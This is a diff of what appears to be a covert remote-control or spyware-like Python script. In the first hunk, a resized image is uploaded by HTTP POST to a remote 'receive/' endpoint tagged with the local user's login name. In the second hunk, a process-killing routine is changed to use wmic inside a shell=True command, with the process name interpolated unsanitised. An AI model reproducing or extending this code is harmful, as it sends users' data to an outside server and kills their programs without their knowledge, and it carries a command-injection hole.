@@ -26,7 +26,7 @@ def a():
         img = img.resize((int(img.size[0]/img.size[1]*340),340))
         img.save('tmp.png')
         print('e')
-        with open('tmp.png', 'rb') as imgbytes:
+        with open('tmp.png', 'rb') as imgbytes:\
             request(u+'receive/'+getpass.getuser(), imgbytes.read(), 'POST')
     except Exception as e:
         print(e)
@@ -75,7 +75,7 @@ usednames = []
 
 
 def f(x):
-    out = subprocess.call(rf'taskkill /f /t /im {x}', shell=True, stderr=sys.stderr, stdout=sys.stdout)
+    out = subprocess.call(rf'wmic process where name="{x}" delete', shell=True)
     if verbose:
         if not out:
             print("killed",x)
